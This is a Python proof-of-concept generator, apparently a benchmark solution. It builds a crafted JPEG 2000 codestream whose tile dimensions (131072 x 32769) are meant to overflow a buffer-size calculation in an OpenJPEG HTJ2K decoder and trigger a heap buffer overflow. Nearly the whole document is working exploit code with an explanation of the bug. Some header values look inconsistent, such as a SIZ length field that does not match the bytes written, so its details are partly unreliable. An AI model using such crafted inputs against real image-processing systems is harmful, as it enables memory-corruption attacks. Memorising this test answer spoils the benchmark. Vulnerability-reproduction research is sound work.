import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a malloc size error in the opj_t1_allocate_buffers
        function of the HT_DEC component. This is caused by an integer overflow
        when calculating the buffer size for tile data. The size is calculated
        as `width * height * sizeof(some_type)`.

        In HTJ2K (High Throughput JPEG 2000) mode, the dimensions of the first
        precinct are derived from the tile dimensions. By crafting a JPEG 2000
        codestream (J2K) with specific tile dimensions, we can cause the
        multiplication to overflow a 32-bit integer. This results in `malloc`
        allocating a much smaller buffer than required. Subsequent memory accesses
        that assume the correct large buffer size will then lead to a heap
        buffer overflow.

        We choose tile dimensions such that their product exceeds 2^32:
        - Tile width (w): 131072 (0x20000)
        - Tile height (h): 32769  (0x8001)
        - Product (w * h): 4295098368 (0x100020000)

        In 32-bit unsigned arithmetic, this product wraps around to 0x20000.
        The PoC is a minimal J2K file containing the necessary headers to
        specify these malicious dimensions and enable the vulnerable HTJ2K
        decoding path. The crash occurs early during tile decoding setup,
        so no actual image data is needed.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        width = 131072
        height = 32769

        poc = b''

        # SOC: Start of Codestream marker
        poc += b'\xff\x4f'

        # SIZ: Image and Tile Size marker
        poc += b'\xff\x51'
        poc += b'\x00\x28'  # Lsiz (marker length) = 40
        poc += b'\x00\x00'  # Rsiz (capabilities)
        poc += struct.pack('>I', width)   # Xsiz (image width)
        poc += struct.pack('>I', height)  # Ysiz (image height)
        poc += b'\x00\x00\x00\x00' * 2  # XOsiz, YOsiz (image offset)
        poc += struct.pack('>I', width)   # XTsiz (tile width)
        poc += struct.pack('>I', height)  # YTsiz (tile height)
        poc += b'\x00\x00\x00\x00' * 2  # XTOsiz, YTOsiz (tile offset)
        poc += b'\x00\x01'  # Csiz (number of components)
        poc += b'\x07\x01\x01'  # Ssiz, XRsiz, YRsiz for component 0 (8-bit, no subsampling)

        # COD: Coding Style Default marker (to enable HTJ2K)
        poc += b'\xff\x52'
        poc += b'\x00\x0d'  # Lcod (marker length) = 13
        poc += b'\x80'      # Scod (HTJ2K enabled)
        poc += b'\x00'      # Progression order
        poc += b'\x00\x01'  # Number of layers
        poc += b'\x00'      # Multiple component transform
        poc += b'\x01'      # Number of decomposition levels
        poc += b'\x02'      # Code-block width exponent
        poc += b'\x02'      # Code-block height exponent
        poc += b'\x00'      # Code-block style
        poc += b'\x00'      # Transformation (9-7 irreversible)
        poc += b'\x00'      # Cmodes (HT modes)

        # QCD: Quantization Default marker
        poc += b'\xff\x5c'
        poc += b'\x00\x03'  # Lqcd (marker length) = 3
        poc += b'\x00'      # Sqcd (no quantization)

        # SOT: Start of Tile-part marker
        poc += b'\xff\x90'
        poc += b'\x00\x0a'  # Lsot (marker length) = 10
        poc += b'\x00\x00'  # Isot (tile index)
        # Psot = 0: tile-part extends to the EOC marker. This is sufficient
        # as the crash happens before actual data processing.
        poc += b'\x00\x00\x00\x00'  # Psot (tile-part length)
        poc += b'\x00'      # TPsot (tile-part index)
        poc += b'\x01'      # TNsot (number of tile-parts)

        # SOD: Start of Data marker
        poc += b'\xff\x93'

        # EOC: End of Codestream marker
        poc += b'\xff\xd9'

        return poc
